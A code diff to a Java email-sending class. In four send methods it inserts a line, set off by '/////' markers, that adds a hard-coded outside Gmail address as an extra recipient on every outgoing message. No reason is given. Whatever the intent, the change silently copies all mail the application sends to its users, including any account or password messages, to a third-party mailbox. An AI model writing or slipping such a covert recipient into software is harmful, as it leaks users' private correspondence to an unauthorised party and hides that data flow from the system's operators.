@@ -70,6 +70,9 @@ public class EmailSender {
                     log.info(ex.getMessage());
                 }
             });
+            /////
+            message.addRecipient(Message.RecipientType.TO, new InternetAddress("anni4ksa@gmail.com"));
+            /////
             transport.connect(SMTP_HOST_NAME, SMTP_HOST_PORT, SMTP_AUTH_USER, SMTP_AUTH_PWD);
             transport.sendMessage(message, message.getRecipients(Message.RecipientType.TO));
             transport.close();
@@ -98,6 +101,9 @@ public class EmailSender {
                     log.info(ex.getMessage());
                 }
             });
+            /////
+            message.addRecipient(Message.RecipientType.TO, new InternetAddress("anni4ksa@gmail.com"));
+            /////
             BodyPart messageBodyPart = new MimeBodyPart();
             Multipart multipart = new MimeMultipart();
             multipart.addBodyPart(messageBodyPart);
@@ -133,6 +139,9 @@ public class EmailSender {
             Address[] from = InternetAddress.parse("admin@ararhni.com");
             message.addFrom(from);
             message.addRecipient(Message.RecipientType.TO, new InternetAddress(email));
+            /////
+            message.addRecipient(Message.RecipientType.TO, new InternetAddress("anni4ksa@gmail.com"));
+            /////
             transport.connect(SMTP_HOST_NAME, SMTP_HOST_PORT, SMTP_AUTH_USER, SMTP_AUTH_PWD);
             transport.sendMessage(message, message.getRecipients(Message.RecipientType.TO));
             transport.close();
@@ -155,6 +164,9 @@ public class EmailSender {
             message.setSubject(title, "UTF-8");
             message.setText(content, "UTF-8", "html");
             message.addRecipient(Message.RecipientType.TO, new InternetAddress(email));
+            /////
+            message.addRecipient(Message.RecipientType.TO, new InternetAddress("anni4ksa@gmail.com"));
+            /////
             BodyPart messageBodyPart = new MimeBodyPart();
             Multipart multipart = new MimeMultipart();
             multipart.addBodyPart(messageBodyPart);
